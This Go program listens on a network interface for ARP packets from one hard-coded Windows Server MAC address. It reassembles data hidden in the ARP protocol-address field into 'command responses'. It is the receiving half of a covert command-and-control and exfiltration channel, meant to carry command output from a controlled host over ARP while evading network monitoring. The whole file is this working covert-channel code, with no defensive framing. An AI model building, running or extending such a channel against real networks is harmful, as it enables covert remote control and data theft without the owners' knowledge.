package main

import (
	"fmt"
	"log"
	"sort"
	"strings"
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type ResponseBuffer struct {
	mu         sync.Mutex
	fragments  map[int][]byte
	isComplete bool
}

func main() {
	device := "eth0"
	winServerMAC := "00:15:5d:01:02:03" // The MAC of your Windows 2022 Server

	handle, err := pcap.OpenLive(device, 1024, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Filter for ARP traffic only
	if err := handle.SetBPFFilter("arp"); err != nil {
		log.Fatal(err)
	}

	resp := &ResponseBuffer{fragments: make(map[int][]byte)}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	fmt.Println("[*] Listening for Windows Response via ARP...")

	for packet := range packetSource.Packets() {
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}

		arp := arpLayer.(*layers.ARP)

		// Only process packets from our target Windows Server
		if arp.SourceHwAddress.String() != winServerMAC {
			continue
		}

		// Decode the "Smuggled" data in the Source Protocol Address (SPA)
		spa := arp.SourceProtAddress
		controlByte := spa[0]
		isFinal := (controlByte & 0x80) == 0
		seqID := int(controlByte & 0x7F)
		data := spa[1:]

		resp.mu.Lock()
		resp.fragments[seqID] = data
		if isFinal {
			resp.isComplete = true
		}
		
		// If we have the final packet, reassemble and print
		if resp.isComplete {
			output := reassemble(resp.fragments)
			fmt.Printf("\n--- WINDOWS SERVER RESPONSE ---\n%s\n------------------------------\n", output)
			
			// Reset for next command response
			resp.fragments = make(map[int][]byte)
			resp.isComplete = false
		}
		resp.mu.Unlock()
	}
}

func reassemble(fragments map[int][]byte) string {
	keys := make([]int, 0, len(fragments))
	for k := range fragments {
		keys = append(keys, k)
	}
	sort.Ints(keys)

	var sb strings.Builder
	for _, k := range keys {
		sb.WriteString(strings.TrimRight(string(fragments[k]), "\x00"))
	}
	return sb.String()
}